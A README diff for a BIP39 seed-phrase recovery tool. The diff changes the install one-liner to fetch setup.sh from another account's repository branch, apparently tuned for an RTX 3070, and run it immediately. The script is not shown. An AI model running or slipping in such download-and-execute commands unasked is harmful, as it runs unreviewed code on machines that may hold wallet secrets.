@@ -10,7 +10,7 @@ Recover missing words of a BIP39 seed phrase for a Bitcoin native SegWit (`bc1q.
 ## Install
 
 ```bash
-curl -O https://raw.githubusercontent.com/zunmax/btc-seedphrase-recovery/main/setup.sh && chmod +x setup.sh && ./setup.sh
+curl -O https://raw.githubusercontent.com/TnzGit/btc-seedphrase-recovery-3070/opt/sm86-rtx3070-r2/setup.sh && chmod +x setup.sh && ./setup.sh
 ```
 
 The script installs build tools, the CUDA toolkit (if missing), and Rust; clones the repo if you ran it from outside; and builds the release binary. At the end it prints the exact path to run.
